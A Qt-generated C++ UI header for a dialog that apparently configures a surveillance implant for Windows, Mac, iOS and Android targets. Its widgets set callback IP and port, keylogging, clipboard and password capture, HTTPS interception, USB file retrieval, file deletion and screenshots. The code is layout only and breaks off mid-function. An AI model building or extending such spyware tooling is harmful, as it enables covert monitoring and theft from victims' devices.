/********************************************************************************
** Form generated from reading UI file 'generatedlg.ui'
**
** Created by: Qt User Interface Compiler version 4.8.6
**
** WARNING! All changes made in this file will be lost when recompiling UI file!
********************************************************************************/

#ifndef UI_GENERATEDLG_H
#define UI_GENERATEDLG_H

#include <QtCore/QVariant>
#include <QtGui/QAction>
#include <QtGui/QApplication>
#include <QtGui/QButtonGroup>
#include <QtGui/QCheckBox>
#include <QtGui/QComboBox>
#include <QtGui/QDialog>
#include <QtGui/QGridLayout>
#include <QtGui/QGroupBox>
#include <QtGui/QHBoxLayout>
#include <QtGui/QHeaderView>
#include <QtGui/QLabel>
#include <QtGui/QLineEdit>
#include <QtGui/QListWidget>
#include <QtGui/QPushButton>
#include <QtGui/QRadioButton>
#include <QtGui/QScrollArea>
#include <QtGui/QSpacerItem>
#include <QtGui/QSpinBox>
#include <QtGui/QTabWidget>
#include <QtGui/QVBoxLayout>
#include <QtGui/QWidget>

QT_BEGIN_NAMESPACE

class Ui_GenerateDlg
{
public:
    QVBoxLayout *verticalLayout;
    QHBoxLayout *horizontalLayout_8;
    QListWidget *lstPlatform;
    QTabWidget *tabWidget;
    QWidget *tab;
    QVBoxLayout *verticalLayout_2;
    QScrollArea *scrollArea;
    QWidget *scrollAreaWidgetContents;
    QVBoxLayout *verticalLayout_8;
    QGroupBox *groupBox;
    QHBoxLayout *horizontalLayout_2;
    QLabel *label;
    QLineEdit *edtGroupId;
    QGroupBox *grpNetEnvironment;
    QHBoxLayout *horizontalLayout_13;
    QRadioButton *chkWIFI;
    QRadioButton *chk3G;
    QGroupBox *grpEnvironment;
    QVBoxLayout *verticalLayout_9;
    QRadioButton *chkRemote;
    QHBoxLayout *horizontalLayout_14;
    QRadioButton *chkLocal;
    QHBoxLayout *horizontalLayout_12;
    QLabel *label_11;
    QComboBox *cmbApkIcon;
    QGroupBox *grpRoot;
    QHBoxLayout *horizontalLayout_11;
    QRadioButton *chkRooted;
    QRadioButton *chkNotRooted;
    QGroupBox *groupBox_2;
    QGridLayout *gridLayout;
    QCheckBox *chkPlg3;
    QCheckBox *checkBox;
    QCheckBox *chkPlg2;
    QCheckBox *chkPlg4;
    QGroupBox *groupBox_3;
    QGridLayout *gridLayout_3;
    QComboBox *cmbIp1;
    QLineEdit *edtIp;
    QLabel *label_2;
    QLineEdit *edtPort;
    QPushButton *btnGetIP;
    QGroupBox *chkAlternate;
    QGridLayout *gridLayout_2;
    QComboBox *cmbIp2;
    QLineEdit *edAlternateIp;
    QLabel *label_3;
    QLineEdit *edtAlternatePort;
    QPushButton *btnGetIP2;
    QSpacerItem *verticalSpacer_2;
    QSpacerItem *verticalSpacer_5;
    QSpacerItem *verticalSpacer_4;
    QWidget *tab_3;
    QVBoxLayout *verticalLayout_6;
    QGroupBox *groupBox_4;
    QGridLayout *gridLayout_4;
    QCheckBox *chkFileOp;
    QCheckBox *chkProcessOp;
    QCheckBox *chkKeyboardOp;
    QCheckBox *chkExecuteOp;
    QCheckBox *chkClipboardOp;
    QGroupBox *grpPassword;
    QVBoxLayout *verticalLayout_7;
    QCheckBox *chkEA_PASSWORD;
    QCheckBox *chkKeyword;
    QLineEdit *edtKeyword;
    QGroupBox *grpDeleteFile;
    QHBoxLayout *horizontalLayout_9;
    QLabel *label_8;
    QLineEdit *edtDeleteFileExt;
    QGroupBox *grpHttps;
    QHBoxLayout *horizontalLayout_10;
    QCheckBox *chkHttpsSend;
    QCheckBox *chkHttpsReceive;
    QSpacerItem *verticalSpacer_3;
    QWidget *tab_2;
    QVBoxLayout *verticalLayout_5;
    QGroupBox *grpUsb;
    QVBoxLayout *verticalLayout_3;
    QCheckBox *chkUsbPlug;
    QCheckBox *chkUsbDir;
    QCheckBox *chkUsbFileRetrieve;
    QHBoxLayout *horizontalLayout_3;
    QLabel *label_4;
    QLineEdit *edtUsbExt;
    QHBoxLayout *horizontalLayout_4;
    QLabel *label_5;
    QSpinBox *spnUsbFileSize;
    QLabel *label_6;
    QSpacerItem *horizontalSpacer_2;
    QGroupBox *groupBox_6;
    QVBoxLayout *verticalLayout_4;
    QCheckBox *chkScreenManual;
    QCheckBox *chkSmartCapture;
    QHBoxLayout *horizontalLayout_7;
    QLabel *label_7;
    QLineEdit *edtProcName;
    QHBoxLayout *horizontalLayout_6;
    QLabel *lbWindowTitle;
    QLineEdit *edtWindowTitle;
    QHBoxLayout *horizontalLayout_5;
    QLabel *label_9;
    QSpinBox *spnInterval;
    QLabel *label_10;
    QSpacerItem *horizontalSpacer_3;
    QSpacerItem *verticalSpacer;
    QHBoxLayout *horizontalLayout;
    QSpacerItem *horizontalSpacer;
    QPushButton *btnOk;
    QPushButton *btnCancel;

    void setupUi(QDialog *GenerateDlg)
    {
        if (GenerateDlg->objectName().isEmpty())
            GenerateDlg->setObjectName(QString::fromUtf8("GenerateDlg"));
        GenerateDlg->resize(470, 474);
        GenerateDlg->setStyleSheet(QString::fromUtf8("QWidget\n"
"{\n"
"	font-family:\"Microsoft Yahei\";\n"
"}"));
        verticalLayout = new QVBoxLayout(GenerateDlg);
        verticalLayout->setSpacing(6);
        verticalLayout->setContentsMargins(11, 11, 11, 11);
        verticalLayout->setObjectName(QString::fromUtf8("verticalLayout"));
        horizontalLayout_8 = new QHBoxLayout();
        horizontalLayout_8->setSpacing(6);
        horizontalLayout_8->setObjectName(QString::fromUtf8("horizontalLayout_8"));
        lstPlatform = new QListWidget(GenerateDlg);
        QIcon icon;
        icon.addFile(QString::fromUtf8(":/image/windows_online.png"), QSize(), QIcon::Normal, QIcon::Off);
        QListWidgetItem *__qlistwidgetitem = new QListWidgetItem(lstPlatform);
        __qlistwidgetitem->setIcon(icon);
        QIcon icon1;
        icon1.addFile(QString::fromUtf8(":/image/mac_online.png"), QSize(), QIcon::Normal, QIcon::Off);
        QListWidgetItem *__qlistwidgetitem1 = new QListWidgetItem(lstPlatform);
        __qlistwidgetitem1->setIcon(icon1);
        QIcon icon2;
        icon2.addFile(QString::fromUtf8(":/image/ipad_iphone.png"), QSize(), QIcon::Normal, QIcon::Off);
        QListWidgetItem *__qlistwidgetitem2 = new QListWidgetItem(lstPlatform);
        __qlistwidgetitem2->setIcon(icon2);
        QIcon icon3;
        icon3.addFile(QString::fromUtf8(":/image/android_online.png"), QSize(), QIcon::Normal, QIcon::Off);
        QListWidgetItem *__qlistwidgetitem3 = new QListWidgetItem(lstPlatform);
        __qlistwidgetitem3->setIcon(icon3);
        lstPlatform->setObjectName(QString::fromUtf8("lstPlatform"));
        lstPlatform->setMinimumSize(QSize(105, 0));
        lstPlatform->setMaximumSize(QSize(105, 16777215));
        lstPlatform->setStyleSheet(QString::fromUtf8("QListWidget::item {\n"
"	min-height:50px;\n"
"	background-color:transparent;\n"
" }\n"
" QListWidget::item:hover {\n"
"	background-color:rgba(100,100,100, 50);\n"
"	min-height:30px;\n"
" }\n"
"  QListWidget::item:selected {\n"
"	background-color:#cccccc;\n"
"	color:black;\n"
" }\n"
"QWidget\n"
"{\n"
"	border:1px solid #999999;\n"
"}"));
        lstPlatform->setFrameShape(QFrame::NoFrame);
        lstPlatform->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOff);
        lstPlatform->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);
        lstPlatform->setEditTriggers(QAbstractItemView::NoEditTriggers);
        lstPlatform->setSelectionBehavior(QAbstractItemView::SelectRows);
        lstPlatform->setIconSize(QSize(32, 32));
        lstPlatform->setMovement(QListView::Static);
        lstPlatform->setFlow(QListView::TopToBottom);
        lstPlatform->setSpacing(0);
        lstPlatform->setViewMode(QListView::ListMode);

        horizontalLayout_8->addWidget(lstPlatform);

        tabWidget = new QTabWidget(GenerateDlg);
        tabWidget->setObjectName(QString::fromUtf8("tabWidget"));
        tab = new QWidget();
        tab->setObjectName(QString::fromUtf8("tab"));
        tab->setStyleSheet(QString::fromUtf8("QWidget#tab\n"
"{\n"
"	background-color:#f2f2f2;\n"
"}"));
        verticalLayout_2 = new QVBoxLayout(tab);
        verticalLayout_2->setSpacing(0);
        verticalLayout_2->setContentsMargins(0, 0, 0, 0);
        verticalLayout_2->setObjectName(QString::fromUtf8("verticalLayout_2"));
        scrollArea = new QScrollArea(tab);
        scrollArea->setObjectName(QString::fromUtf8("scrollArea"));
        scrollArea->setStyleSheet(QString::fromUtf8(" QScrollBar:vertical {\n"
"     border: 0px solid grey;\n"
"     background: transparent;\n"
"     width: 10px;\n"
" }\n"
" QScrollBar::handle:vertical {\n"
"     background: #cccccc;;\n"
"     min-height: 100px;\n"
" }\n"
" QScrollBar::handle:vertical:hover {\n"
"     background: #aaaaaa;\n"
"     min-heiht: 100px;\n"
" }\n"
" QScrollBar::add-line:vertical {\n"
"	border:none;\n"
"	background:transparent;\n"
" }\n"
" QScrollBar::sub-line:vertical {\n"
"	border:none;\n"
"	background:transparent;\n"
" }"));
        scrollArea->setFrameShape(QFrame::NoFrame);
        scrollArea->setWidgetResizable(true);
        scrollAreaWidgetContents = new QWidget();
        scrollAreaWidgetContents->setObjectName(QString::fromUtf8("scrollAreaWidgetContents"));
        scrollAreaWidgetContents->setGeometry(QRect(0, 0, 323, 598));
        verticalLayout_8 = new QVBoxLayout(scrollAreaWidgetContents);
        verticalLayout_8->setSpacing(6);
        verticalLayout_8->setContentsMargins(11, 11, 11, 11);
        verticalLayout_8->setObjectName(QString::fromUtf8("verticalLayout_8"));
        groupBox = new QGroupBox(scrollAreaWidgetContents);
        groupBox->setObjectName(QString::fromUtf8("groupBox"));
        horizontalLayout_2 = new QHBoxLayout(groupBox);
        horizontalLayout_2->setSpacing(6);
        horizontalLayout_2->setContentsMargins(11, 11, 11, 11);
        horizontalLayout_2->setObjectName(QString::fromUtf8("horizontalLayout_2"));
        label = new QLabel(groupBox);
        label->setObjectName(QString::fromUtf8("label"));
        label->setMinimumSize(QSize(60, 0));

        horizontalLayout_2->addWidget(label);

        edtGroupId = new QLineEdit(groupBox);
        edtGroupId->setObjectName(QString::fromUtf8("edtGroupId"));

        horizontalLayout_2->addWidget(edtGroupId);


        verticalLayout_8->addWidget(groupBox);

        grpNetEnvironment = new QGroupBox(scrollAreaWidgetContents);
        grpNetEnvironment->setObjectName(QString::fromUtf8("grpNetEnvironment"));
        horizontalLayout_13 = new QHBoxLayout(grpNetEnvironment);
        horizontalLayout_13->setSpacing(6);
        horizontalLayout_13->setContentsMargins(11, 11, 11, 11);
        horizontalLayout_13->setObjectName(QString::fromUtf8("horizontalLayout_13"));
        chkWIFI = new QRadioButton(grpNetEnvironment);
        chkWIFI->setObjectName(QString::fromUtf8("chkWIFI"));
        chkWIFI->setMinimumSize(QSize(151, 0));
        chkWIFI->setChecked(true);

        horizontalLayout_13->addWidget(chkWIFI);

        chk3G = new QRadioButton(grpNetEnvironment);
        chk3G->setObjectName(QString::fromUtf8("chk3G"));

        horizontalLayout_13->addWidget(chk3G);


        verticalLayout_8->addWidget(grpNetEnvironment);

        grpEnvironment = new QGroupBox(scrollAreaWidgetContents);
        grpEnvironment->setObjectName(QString::fromUtf8("grpEnvironment"));
        verticalLayout_9 = new QVBoxLayout(grpEnvironment);
        verticalLayout_9->setSpacing(6);
        verticalLayout_9->setContentsMargins(11, 11, 11, 11);
        verticalLayout_9->setObjectName(QString::fromUtf8("verticalLayout_9"));
        chkRemote = new QRadioButton(grpEnvironment);
        chkRemote->setObjectName(QString::fromUtf8("chkRemote"));
        chkRemote->setMinimumSize(QSize(151, 0));
        chkRemote->setChecked(true);

        verticalLayout_9->addWidget(chkRemote);

        horizontalLayout_14 = new QHBoxLayout();
        horizontalLayout_14->setSpacing(6);
        horizontalLayout_14->setObjectName(QString::fromUtf8("horizontalLayout_14"));
        chkLocal = new QRadioButton(grpEnvironment);
        chkLocal->setObjectName(QString::fromUtf8("chkLocal"));

        horizontalLayout_14->addWidget(chkLocal);

        horizontalLayout_12 = new QHBoxLayout();
        horizontalLayout_12->setSpacing(6);
        horizontalLayout_12->setObjectName(QString::fromUtf8("horizontalLayout_12"));
        label_11 = new QLabel(grpEnvironment);
        label_11->setObjectName(QString::fromUtf8("label_11"));

        horizontalLayout_12->addWidget(label_11);

        cmbApkIcon = new QComboBox(grpEnvironment);
        cmbApkIcon->setObjectName(QString::fromUtf8("cmbApkIcon"));

        horizontalLayout_12->addWidget(cmbApkIcon);


        horizontalLayout_14->addLayout(horizontalLayout_12);


        verticalLayout_9->addLayout(horizontalLayout_14);


        verticalLayout_8->addWidget(grpEnvironment);

        grpRoot = new QGroupBox(scrollAreaWidgetContents);
        grpRoot->setObjectName(QString::fromUtf8("grpRoot"));
        horizontalLayout_11 = new QHBoxLayout(grpRoot);
        horizontalLayout_11->setSpacing(6);
        horizontalLayout_11->setContentsMargins(11, 11, 11, 11);
        horizontalLayout_11->setObjectName(QString::fromUtf8("horizontalLayout_11"));
        chkRooted = new QRadioButton(grpRoot);
        chkRooted->setObjectName(QString::fromUtf8("chkRooted"));
        chkRooted->setMinimumSize(QSize(151, 0));
        chkRooted->setChecked(true);

        horizontalLayout_11->addWidget(chkRooted);

        chkNotRooted = new QRadioButton(grpRoot);
        chkNotRooted->setObjectName(QString::fromUtf8("chkNotRooted"));

        horizontalLayout_11->addWidget(chkNotRooted);


        verticalLayout_8->addWidget(grpRoot);

        groupBox_2 = new QGroupBox(scrollAreaWidgetContents);
        groupBox_2->setObjectName(QString::fromUtf8("groupBox_2"));
        gridLayout = new QGridLayout(groupBox_2);
        gridLayout->setSpacing(6);
        gridLayout->setContentsMargins(11, 11, 11, 11);
        gridLayout->setObjectName(QString::fromUtf8("gridLayout"));
        chkPlg3 = new QCheckBox(groupBox_2);
        chkPlg3->setObjectName(QString::fromUtf8("chkPlg3"));
        chkPlg3->setStyleSheet(QString::fromUtf8("QWidget\n"
"{\n"
"	color:rgba(0,0,0,255);\n"
"}\n"
"\n"
" QCheckBox::indicator {\n"
"     width: 14px;\n"
"     height: 14px;\n"
" }\n"
"QCheckBox::indicator:checked:disabled {\n"
"     image: url(:/image/radio.png);\n"
"}"));
        chkPlg3->setChecked(true);

        gridLayout->addWidget(chkPlg3, 2, 2, 1, 1);

        checkBox = new QCheckBox(groupBox_2);
        checkBox->setObjectName(QString::fromUtf8("checkBox"));
        checkBox->setEnabled(false);
        checkBox->setStyleSheet(QString::fromUtf8("QWidget\n"
"{\n"
"	color:rgba(0,0,0,255);\n"
"}\n"
"\n"
" QCheckBox::indicator {\n"
"     width: 14px;\n"
"     height: 14px;\n"
" }\n"
"QCheckBox::indicator:checked:disabled {\n"
"     image: url(:/image/radio.png);\n"
"}"));
        checkBox->setChecked(true);

        gridLayout->addWidget(checkBox, 0, 0, 1, 1);

        chkPlg2 = new QCheckBox(groupBox_2);
        chkPlg2->setObjectName(QString::fromUtf8("chkPlg2"));
        chkPlg2->setStyleSheet(QString::fromUtf8("QWidget\n"
"{\n"
"	color:rgba(0,0,0,255);\n"
"}\n"
"\n"
" QCheckBox::indicator {\n"
"     width: 14px;\n"
"     height: 14px;\n"
" }\n"
"QCheckBox::indicator:checked:disabled {\n"
"     image: url(:/image/radio.png);\n"
"}"));
        chkPlg2->setCheckable(true);
        chkPlg2->setChecked(true);

        gridLayout->addWidget(chkPlg2, 2, 0, 1, 2);

        chkPlg4 = new QCheckBox(groupBox_2);
        chkPlg4->setObjectName(QString::fromUtf8("chkPlg4"));
        chkPlg4->setMinimumSize(QSize(119, 0));
        chkPlg4->setStyleSheet(QString::fromUtf8("QWidget\n"
"{\n"
"	color:rgba(0,0,0,255);\n"
"}\n"
"\n"
" QCheckBox::indicator {\n"
"     width: 14px;\n"
"     height: 14px;\n"
" }\n"
"QCheckBox::indicator:checked:disabled {\n"
"     image: url(:/image/radio.png);\n"
"}"));
        chkPlg4->setChecked(true);

        gridLayout->addWidget(chkPlg4, 0, 2, 1, 1);


        verticalLayout_8->addWidget(groupBox_2);

        groupBox_3 = new QGroupBox(scrollAreaWidgetContents);
        groupBox_3->setObjectName(QString::fromUtf8("groupBox_3"));
        gridLayout_3 = new QGridLayout(groupBox_3);
        gridLayout_3->setSpacing(6);
        gridLayout_3->setContentsMargins(11, 11, 11, 11);
        gridLayout_3->setObjectName(QString::fromUtf8("gridLayout_3"));
        cmbIp1 = new QComboBox(groupBox_3);
        cmbIp1->setObjectName(QString::fromUtf8("cmbIp1"));

        gridLayout_3->addWidget(cmbIp1, 0, 0, 1, 1);

        edtIp = new QLineEdit(groupBox_3);
        edtIp->setObjectName(QString::fromUtf8("edtIp"));

        gridLayout_3->addWidget(edtIp, 0, 1, 1, 1);

        label_2 = new QLabel(groupBox_3);
        label_2->setObjectName(QString::fromUtf8("label_2"));

        gridLayout_3->addWidget(label_2, 1, 0, 1, 1);

        edtPort = new QLineEdit(groupBox_3);
        edtPort->setObjectName(QString::fromUtf8("edtPort"));

        gridLayout_3->addWidget(edtPort, 1, 1, 1, 1);

        btnGetIP = new QPushButton(groupBox_3);
        btnGetIP->setObjectName(QString::fromUtf8("btnGetIP"));
        btnGetIP->setEnabled(false);
        btnGetIP->setMaximumSize(QSize(50, 16777215));

        gridLayout_3->addWidget(btnGetIP, 0, 2, 1, 1);


        verticalLayout_8->addWidget(groupBox_3);

        chkAlternate = new QGroupBox(scrollAreaWidgetContents);
        chkAlternate->setObjectName(QString::fromUtf8("chkAlternate"));
        chkAlternate->setCheckable(true);
        chkAlternate->setChecked(false);
        gridLayout_2 = new QGridLayout(chkAlternate);
        gridLayout_2->setSpacing(6);
        gridLayout_2->setContentsMargins(11, 11, 11, 11);
        gridLayout_2->setObjectName(QString::fromUtf8("gridLayout_2"));
        cmbIp2 = new QComboBox(chkAlternate);
        cmbIp2->setObjectName(QString::fromUtf8("cmbIp2"));

        gridLayout_2->addWidget(cmbIp2, 0, 0, 1, 1);

        edAlternateIp = new QLineEdit(chkAlternate);
        edAlternateIp->setObjectName(QString::fromUtf8("edAlternateIp"));

        gridLayout_2->addWidget(edAlternateIp, 0, 1, 1, 1);

        label_3 = new QLabel(chkAlternate);
        label_3->setObjectName(QString::fromUtf8("label_3"));

        gridLayout_2->addWidget(label_3, 1, 0, 1, 1);

        edtAlternatePort = new QLineEdit(chkAlternate);
        edtAlternatePort->setObjectName(QString::fromUtf8("edtAlternatePort"));

        gridLayout_2->addWidget(edtAlternatePort, 1, 1, 1, 1);

        btnGetIP2 = new QPushButton(chkAlternate);
        btnGetIP2->setObjectName(QString::fromUtf8("btnGetIP2"));
        btnGetIP2->setEnabled(false);
        btnGetIP2->setMaximumSize(QSize(50, 16777215));

        gridLayout_2->addWidget(btnGetIP2, 0, 2, 1, 1);

        verticalSpacer_2 = new QSpacerItem(20, 40, QSizePolicy::Minimum, QSizePolicy::Expanding);

        gridLayout_2->addItem(verticalSpacer_2, 2, 1, 1, 1);


        verticalLayout_8->addWidget(chkAlternate);

        verticalSpacer_5 = new QSpacerItem(20, 40, QSizePolicy::Minimum, QSizePolicy::Expanding);

        verticalLayout_8->addItem(verticalSpacer_5);

        verticalSpacer_4 = new QSpacerItem(20, 40, QSizePolicy::Minimum, QSizePolicy::Expanding);

        verticalLayout_8->addItem(verticalSpacer_4);

        scrollArea->setWidget(scrollAreaWidgetContents);

        verticalLayout_2->addWidget(scrollArea);

        tabWidget->addTab(tab, QString());
        tab_3 = new QWidget();
        tab_3->setObjectName(QString::fromUtf8("tab_3"));
        tab_3->setStyleSheet(QString::fromUtf8("QWidget#tab_3\n"
"{\n"
"	background-color:#f2f2f2;\n"
"}"));
        verticalLayout_6 = new QVBoxLayout(tab_3);
        verticalLayout_6->setSpacing(6);
        verticalLayout_6->setContentsMargins(11, 11, 11, 11);
        verticalLayout_6->setObjectName(QString::fromUtf8("verticalLayout_6"));
        groupBox_4 = new QGroupBox(tab_3);
        groupBox_4->setObjectName(QString::fromUtf8("groupBox_4"));
        gridLayout_4 = new QGridLayout(groupBox_4);
        gridLayout_4->setSpacing(6);
        gridLayout_4->setContentsMargins(11, 11, 11, 11);
        gridLayout_4->setObjectName(QString::fromUtf8("gridLayout_4"));
        chkFileOp = new QCheckBox(groupBox_4);
        chkFileOp->setObjectName(QString::fromUtf8("chkFileOp"));
        chkFileOp->setChecked(true);

        gridLayout_4->addWidget(chkFileOp, 0, 0, 1, 1);

        chkProcessOp = new QCheckBox(groupBox_4);
        chkProcessOp->setObjectName(QString::fromUtf8("chkProcessOp"));

        gridLayout_4->addWidget(chkProcessOp, 0, 1, 1, 1);

        chkKeyboardOp = new QCheckBox(groupBox_4);
        chkKeyboardOp->setObjectName(QString::fromUtf8("chkKeyboardOp"));
        chkKeyboardOp->setChecked(true);

        gridLayout_4->addWidget(chkKeyboardOp, 1, 0, 1, 1);

        chkExecuteOp = new QCheckBox(groupBox_4);
        chkExecuteOp->setObjectName(QString::fromUtf8("chkExecuteOp"));

        gridLayout_4->addWidget(chkExecuteOp, 1, 1, 1, 1);

        chkClipboardOp = new QCheckBox(groupBox_4);
        chkClipboardOp->setObjectName(QString::fromUtf8("chkClipboardOp"));
        chkClipboardOp->setChecked(true);

        gridLayout_4->addWidget(chkClipboardOp, 2, 0, 1, 1);


        verticalLayout_6->addWidget(groupBox_4);

        grpPassword = new QGroupBox(tab_3);
        grpPassword->setObjectName(QString::fromUtf8("grpPassword"));
        grpPassword->setCheckable(true);
        verticalLayout_7 = new QVBoxLayout(grpPassword);
        verticalLayout_7->setSpacing(6);
        verticalLayout_7->setContentsMargins(11, 11, 11, 11);
        verticalLayout_7->setObjectName(QString::fromUtf8("verticalLayout_7"));
        chkEA_PASSWORD = new QCheckBox(grpPassword);
        chkEA_PASSWORD->setObjectName(QString::fromUtf8("chkEA_PASSWORD"));
        chkEA_PASSWORD->setChecked(true);

        verticalLayout_7->addWidget(chkEA_PASSWORD);

        chkKeyword = new QCheckBox(grpPassword);
        chkKeyword->setObjectName(QString::fromUtf8("chkKeyword"));
        chkKeyword->setChecked(true);

        verticalLayout_7->addWidget(chkKeyword);

        edtKeyword = new QLineEdit(grpPassword);
        edtKeyword->setObjectName(QString::fromUtf8("edtKeyword"));

        verticalLayout_7->addWidget(edtKeyword);


        verticalLayout_6->addWidget(grpPassword);

        grpDeleteFile = new QGroupBox(tab_3);
        grpDeleteFile->setObjectName(QString::fromUtf8("grpDeleteFile"));
        grpDeleteFile->setCheckable(true);
        horizontalLayout_9 = new QHBoxLayout(grpDeleteFile);
        horizontalLayout_9->setSpacing(6);
        horizontalLayout_9->setContentsMargins(11, 11, 11, 11);
        horizontalLayout_9->setObjectName(QString::fromUtf8("horizontalLayout_9"));
        label_8 = new QLabel(grpDeleteFile);
        label_8->setObjectName(QString::fromUtf8("label_8"));

        horizontalLayout_9->addWidget(label_8);

        edtDeleteFileExt = new QLineEdit(grpDeleteFile);
        edtDeleteFileExt->setObjectName(QString::fromUtf8("edtDeleteFileExt"));

        horizontalLayout_9->addWidget(edtDeleteFileExt);


        verticalLayout_6->addWidget(grpDeleteFile);

        grpHttps = new QGroupBox(tab_3);
        grpHttps->setObjectName(QString::fromUtf8("grpHttps"));
        grpHttps->setCheckable(true);
        horizontalLayout_10 = new QHBoxLayout(grpHttps);
        horizontalLayout_10->setSpacing(6);
        horizontalLayout_10->setContentsMargins(11, 11, 11, 11);
        horizontalLayout_10->setObjectName(QString::fromUtf8("horizontalLayout_10"));
        chkHttpsSend = new QCheckBox(grpHttps);
        chkHttpsSend->setObjectName(QString::fromUtf8("chkHttpsSend"));
        chkHttpsSend->setChecked(true);

        horizontalLayout_10->addWidget(chkHttpsSend);

        chkHttpsReceive = new QCheckBox(grpHttps);
        chkHttpsReceive->setObjectName(QString::fromUtf8("chkHttpsReceive"));

        horizontalLayout_10->addWidget(chkHttpsReceive);


        verticalLayout_6->addWidget(grpHttps);

        verticalSpacer_3 = new QSpacerItem(20, 0, QSizePolicy::Minimum, QSizePolicy::Expanding);

        verticalLayout_6->addItem(verticalSpacer_3);

        tabWidget->addTab(tab_3, QString());
        tab_2 = new QWidget();
        tab_2->setObjectName(QString::fromUtf8("tab_2"));
        tab_2->setStyleSheet(QString::fromUtf8("QWidget#tab_2\n"
"{\n"
"	background-color:#f2f2f2;\n"
"}"));
        verticalLayout_5 = new QVBoxLayout(tab_2);
        verticalLayout_5->setSpacing(6);
        verticalLayout_5->setContentsMargins(11, 11, 11, 11);
        verticalLayout_5->setObjectName(QString::fromUtf8("verticalLayout_5"));
        grpUsb = new QGroupBox(tab_2);
        grpUsb->setObjectName(QString::fromUtf8("grpUsb"));
        verticalLayout_3 = new QVBoxLayout(grpUsb);
        verticalLayout_3->setSpacing(6);
        verticalLayout_3->setContentsMargins(11, 11, 11, 11);
        verticalLayout_3->setObjectName(QString::fromUtf8("verticalLayout_3"));
        chkUsbPlug = new QCheckBox(grpUsb);
        chkUsbPlug->setObjectName(QString::fromUtf8("chkUsbPlug"));
        chkUsbPlug->setChecked(true);

        verticalLayout_3->addWidget(chkUsbPlug);

        chkUsbDir = new QCheckBox(grpUsb);
        chkUsbDir->setObjectName(QString::fromUtf8("chkUsbDir"));
        chkUsbDir->setChecked(true);

        verticalLayout_3->addWidget(chkUsbDir);

        chkUsbFileRetrieve = new QCheckBox(grpUsb);
        chkUsbFileRetrieve->setObjectName(QString::fromUtf8("chkUsbFileRetrieve"));
        chkUsbFileRetrieve->setChecked(true);

        verticalLayout_3->addWidget(chkUsbFileRetrieve);

        horizontalLayout_3 = new QHBoxLayout();
        horizontalLayout_3->setSpacing(6);
        horizontalLayout_3->setObjectName(QString::fromUtf8("horizontalLayout_3"));
        label_4 = new QLabel(grpUsb);
        label_4->setObjectName(QString::fromUtf8("label_4"));
        label_4->setMinimumSize(QSize(96, 0));

        horizontalLayout_3->addWidget(label_4);

        edtUsbExt = new QLineEdit(grpUsb);
        edtUsbExt->setObjectName(QString::fromUtf8("edtUsbExt"));

        horizontalLayout_3->addWidget(edtUsbExt);


        verticalLayout_3->addLayout(horizontalLayout_3);

        horizontalLayout_4 = new QHBoxLayout();
        horizontalLayout_4->setSpacing(6);
        horizontalLayout_4->setObjectName(QString::fromUtf8("horizontalLayout_4"));
        label_5 = new QLabel(grpUsb);
        label_5->setObjectName(QString::fromUtf8("label_5"));

        horizontalLayout_4->addWidget(label_5);

        spnUsbFileSize = new QSpinBox(grpUsb);
        spnUsbFileSize->setObjectName(QString::fromUtf8("spnUsbFileSize"));
        spnUsbFileSize->setValue(50);

        horizontalLayout_4->addWidget(spnUsbFileSize);

        label_6 = new QLabel(grpUsb);
        label_6->setObjectName(QString::fromUtf8("label_6"));

        horizontalLayout_4->addWidget(label_6);

        horizontalSpacer_2 = new QSpacerItem(40, 20, QSizePolicy::Expanding, QSizePolicy::Minimum);

        horizontalLayout_4->addItem(horizontalSpacer_2);


        verticalLayout_3->addLayout(horizontalLayout_4);


        verticalLayout_5->addWidget(grpUsb);

        groupBox_6 = new QGroupBox(tab_2);
        groupBox_6->setObjectName(QString::fromUtf8("groupBox_6"));
        verticalLayout_4 = new QVBoxLayout(groupBox_6);
        verticalLayout_4->setSpacing(6);
        verticalLayout_4->setContentsMargins(11, 11, 11, 11);
        verticalLayout_4->setObjectName(QString::fromUtf8("verticalLayout_4"));
        chkScreenManual = new QCheckBox(groupBox_6);
        chkScreenManual->setObjectName(QString::fromUtf8("chkScreenManual"));
        chkScreenManual->setEnabled(false);
        chkScreenManual->setChecked(true);

        verticalLayout_4->addWidget(chkScreenManual);

        chkSmartCapture = new QCheckBox(groupBox_6);
        chkSmartCapture->setObjectName(QString::fromUtf8("chkSmartCapture"));
        chkSmartCapture->setChecked(true);

        verticalLayout_4->addWidget(chkSmartCapture);

        horizontalLayout_7 = new QHBoxLayout();
        horizontalLayout_7->setSpacing(6);
        horizontalLayout_7->setObjectName(QString::fromUtf8("horizontalLayout_7"));
        label_7 = new QLabel(groupBox_6);
        label_7->setObjectName(QString::fromUtf8("label_7"));
        label_7->setMinimumSize(QSize(72, 0));

        horizontalLayout_7->addWidget(label_7);

        edtProcName = new QLineEdit(groupBox_6);
        edtProcName->setObjectName(QString::fromUtf8("edtProcName"));

        horizontalLayout_7->addWidget(edtProcName);


        verticalLayout_4->addLayout(horizontalLayout_7);

        horizontalLayout_6 = new QHBoxLayout();
        horizontalLayout_6->setSpacing(6);
        horizontalLayout_6->setObjectName(QString::fromUtf8("horizontalLayout_6"));
        lbWindowTitle = new QLabel(groupBox_6);
        lbWindowTitle->setObjectName(QString::fromUtf8("lbWindowTitle"));
        lbWindowTitle->setMinimumSize(QSize(72, 0));

        horizontalLayout_6->addWidget(lbWindowTitle);

        edtWindowTitle = new QLineEdit(groupBox_6);
        edtWindowTitle->setObjectName(QString::fromUtf8("edtWindowTitle"));

        horizontalLayout_6->addWidget(edtWindowTitle);


        verticalLayout_4->addLayout(horizontalLayout_6);

        horizontalLayout_5 = new QHBoxLayout();
        horizontalLayout_5->setSpacing(6);
        horizontalLayout_5->setObjectName(QString::fromUtf8("horizontalLayout_5"));
        label_9 = new QLabel(groupBox_6);
        label_9->setObjectName(QString::fromUtf8("label_9"));

        horizontalLayout_5->addWidget(label_9);

        spnInterval = new QSpinBox(groupBox_6);
        spnInterval->setObjectName(QString::fromUtf8("spnInterval"));
        spnInterval->setMinimum(15);
        spnInterval->setValue(20);

        horizontalLayout_5->addWidget(spnInterval);

        label_10 = new QLabel(groupBox_6);
        label_10->setObjectName(QString::fromUtf8("label_10"));

        horizontalLayout_5->addWidget(label_10);

        horizontalSpacer_3 = new QSpacerItem(40, 20, QSizePolicy::Expanding, QSizePolicy::Minimum);

        horizontalLayout_5->addItem(horizontalSpacer_3);


        verticalLayout_4->addLayout(horizontalLayout_5);

        verticalSpacer = new QSpacerItem(20, 40, QSizePolicy::Minimum, QSizePolicy::Expanding);

